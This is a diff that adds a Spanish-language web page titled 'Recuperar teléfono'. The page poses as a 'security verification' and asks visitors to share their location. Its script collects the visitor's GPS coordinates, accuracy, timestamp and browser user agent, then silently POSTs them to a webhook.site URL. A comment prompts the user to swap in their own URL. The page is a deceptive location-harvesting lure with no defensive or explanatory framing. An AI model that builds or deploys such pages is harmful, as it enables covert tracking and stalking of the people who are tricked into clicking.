@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recuperar teléfono</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      background: #f4f6f8;
+      color: #333;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    button {
+      background: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .msg {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Verificación de seguridad</h1>
+  <p>Por favor confirma tu ubicación para continuar:</p>
+  <button onclick="sendLocation()">Compartir mi ubicación</button>
+  <div class="msg" id="msg"></div>
+
+  <script>
+    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 🔴 reemplaza esto
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        document.getElementById("msg").innerText = "Tu navegador no soporta geolocalización.";
+        return;
+      }
+
+      document.getElementById("msg").innerText = "Obteniendo ubicación...";
+
+      navigator.geolocation.getCurrentPosition(success, error);
+    }
+
+    function success(position) {
+      const data = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        acc: position.coords.accuracy,
+        time: new Date().toISOString(),
+        ua: navigator.userAgent
+      };
+
+      fetch(REPORT_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      document.getElementById("msg").innerText = "Ubicación enviada correctamente ✅";
+    }
+
+    function error() {
+      document.getElementById("msg").innerText = "No se pudo obtener tu ubicación ❌";
+    }
+  </script>
+</body>
+</html>
